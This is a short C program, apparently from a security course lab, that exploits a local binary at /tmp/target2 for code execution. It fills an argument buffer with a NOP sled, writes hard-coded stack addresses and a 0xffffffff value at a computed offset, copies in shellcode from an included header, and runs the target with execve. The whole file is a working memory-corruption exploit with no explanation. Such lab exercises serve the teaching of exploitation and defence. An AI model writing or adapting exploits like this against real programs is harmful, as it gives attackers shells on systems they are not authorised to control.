#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char attack_string[201];
  memset(attack_string, '\x90', sizeof(attack_string));
  attack_string[200] = 0;
  
  int offset = 0xbffffd00 - 0xbffffcc8;
  *(int *) (attack_string + offset) = 0xffffffff;
  *(int *) (attack_string + offset + 4) = 0xbffffd00 + 4 + 4;
  memcpy(attack_string + offset + 4 + 4, shellcode, strlen(shellcode)); 

  char *args[] = { TARGET, attack_string, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}